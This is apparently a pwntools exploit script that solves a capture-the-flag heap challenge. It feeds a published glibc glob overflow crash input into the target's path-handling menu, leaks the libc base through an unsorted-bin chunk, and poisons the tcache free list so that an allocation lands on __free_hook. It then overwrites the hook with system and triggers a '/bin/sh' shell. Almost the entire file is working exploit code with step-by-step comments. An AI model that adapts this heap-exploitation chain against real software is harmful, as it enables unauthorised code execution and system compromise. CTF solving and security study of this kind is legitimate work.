#!/usr/bin/env python3

from pwn import *

the_binary = "./chall"
context.binary = the_binary
elf = context.binary
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    io = remote("pwn.challenge.bi0s.in", 1299)
elif args.STRACE:
    io = process(["strace", "-o" ,"trace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        dir src/

        # Start of glob function
        # break glob.c:276

        continue
    """)

def pad(original, new_len, pad_char):
    assert new_len >= len(original)
    return original + (new_len - len(original)) * pad_char

def send_int(i):
    io.sendlineafter(">> ", str(i))
menu = send_int

def add_path(idx, path, path_len=None, null_char="\x00"):
    if path[-1] != "\x00":
        path += null_char

    if path_len is None:
        path_len = len(path)

    assert path_len >= len(path)

    menu(1)
    send_int(idx)
    send_int(path_len)
    io.sendafter("path >> ", path)

def check_path(idx):
    menu(2)
    send_int(idx)

    resp = io.recvline()
    if b"not found" in resp:
        return None

    io.recvuntil("found\n")
    return io.recvuntil("\n ---", drop=True)

def view_path(idx):
    menu(3)
    send_int(idx)
    io.recvuntil("Path : ")
    return io.recvuntil("\n ---", drop=True)

def remove_path(idx):
    menu(4)
    send_int(idx)

# Slightly adapted crashing/overflowing input from the bug report at:
# https://sourceware.org/bugzilla/show_bug.cgi?id=22332
poc_crash = [
  0x7e, 0xff, 0xff, 0xf1, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf7, 0x78, 0x63,
  0x6f, 0x6e, 0x66, 0x69, 0x67, 0x3d, 0x78, 0xff, 0xff, 0x6c, 0x69, 0x73,
  0x6d, 0x60, 0x69, 0x6e, 0x72, 0x3b, 0x6f, 0x78, 0x73, 0x65, 0x4c, 0x69,
  0x6e, 0x75, 0x78, 0x66, 0x73, 0x79, 0x33, 0x73, 0x73, 0x77, 0x6f, 0x72,
  0x64, 0x53, 0x53, 0x53, 0x25, 0x53, 0x5c, 0x6f, 0x75, 0x74, 0x70, 0x75,
  0x74, 0x2d, 0x66, 0x53, 0x53, 0x3d, 0x78, 0xff, 0xff, 0x6c, 0x69, 0x73,
  0x6d, 0x60, 0x69, 0x6e, 0x72, 0x3b, 0x6f, 0x78, 0x73, 0x65, 0x4c, 0x69,
  0x6e, 0x75, 0x78, 0x66, 0x73, 0x79, 0x33, 0x73, 0x73, 0x77, 0x6f, 0x72,
  0x64, 0x53, 0x53, 0x51, 0x53, 0x53, 0x53, 0x53, 0x53, 0x25, 0x53, 0x5c,
  0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x78,
  0x79, 0x3d, 0x79, 0x3a, 0x6e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
  0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
  0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x53, 0x5c, 0x53, 0x53, 0x53, 0x53, 0x53,
  0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x2f, 0x78, 0x53, 0x53, 0x53, 0x53,
  0x53, 0x53, 0x53, 0x25, 0x53, 0x5c, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53,
  0x53, 0x53, 0x53, 0x53, 0x53, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
  0x6f, 0x79, 0x3d, 0x79, 0x3a, 0x6e, 0x6f, 0x2d, 0x70, 0x72, 0x6f, 0x78,
  0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x25, 0x53, 0x5c, 0x53, 0x53,
  0x53, 0x53, 0x53, 0x53, 0x78, 0x79, 0x79,
  0x3a, 0x6e, 0x6f, 0x2d, 0x70, 0x72, 0x6f, 0x78, 0x53, 0x53, 0x53, 0x53,
  0x53, 0x53, 0x53, 0x25, 0x53, 0x5c, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53,
  0x53, 0x53, 0x53, 0x53, 0x53, 0x78, 0x79, 0x3d, 0x79, 0x78, 0x79, 0x3d,
  0x79, 0x3a, 0x6e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
  0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x53, 0x53, 0x6d, 0x53, 0x25, 0x53,
  0x5c, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53,
  0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x6f, 0x79, 0x3d, 0x79, 0x2f,
  0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x6f, 0x79, 0x3d, 0x79, 0x3a,
  0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x6d, 0x61, 0x69
]

# Set conditions for a libc leak through this large chunk that will end up in
# unsorted bin.
add_path(0, "A"*0x10, path_len=0x1000)

# This path will overflow from a 0x90-sized chunk into the next one. This chunk
# also serves to prevent the libc-leaking 0x1000-sized chunk from coalescing
# with the top chunk.
overflow = bytes(poc_crash)
add_path(3, overflow, path_len=0x200, null_char=b"\x00")

# Setup libc leak by freeing a big chunk, freeing it to link in libc
# unsorted bin pointers, and re-allocating a path over it without over-
# writing the libc pointers.
remove_path(0)
add_path(2, "\x00", path_len=0x1000)
libc_leak = u64(view_path(2).ljust(0, b"\x00"))
libc.address = libc_leak - 0x1ebb00
log.info("libc leak: %#x" % libc_leak)
log.info("libc base: %#x" % libc.address)

# Goal: one-byte overwrite of tcache fd pointer in freed chunk.
add_path(4, "C"*(0x90-0x10))
add_path(5, "D"*0xa0)   # buffer between overflown C chunk and target E chunk
add_path(6, "E"*0x200)  # chunk that we will free and attempt to overwrite lsb
                        # of its fd pointer in the tcache freelist
add_path(  # forge an entry in the 0x210 tcache freelist
    7,
    pad(b"F"*(0x1f0-8) + p64(0x211) + p64(libc.sym.__free_hook), 0x200, b"F"),
    null_char=b"\x00"
)
add_path(8, "G"*0x200)  # tcache chunk originally pointed to by fd pointer in
                        # E (before E is overflown)

# Even though path 7 (the F chunk) is used in our exploit to host a fake
# tcache list entry, we still have to free it to make the tcache 0x210
# freelist's count big enough to eventually service our forged request.
#
# End result of these 3 frees is:
# [0x210 freelist] -> E -> G -> F
remove_path(7)
remove_path(8)
remove_path(6)

# Free 0x90-sized chunk that will be used by glob functionality and overflow
# into E.
remove_path(4)

# This check_path call will cause the 0x90-sized chunk (previously occupied by
# C above) to overflow into the two adjacent D and E chunks on the heap.
check_path(3)

add_path(8, "H"*0x200)
add_path(9, "/bin/sh\x00", path_len=0x200)
add_path(1, p64(libc.sym.system), path_len=0x200, null_char=b"\x00")

# Trigger __free_hook("/bin/sh")
remove_path(9)
io.interactive()
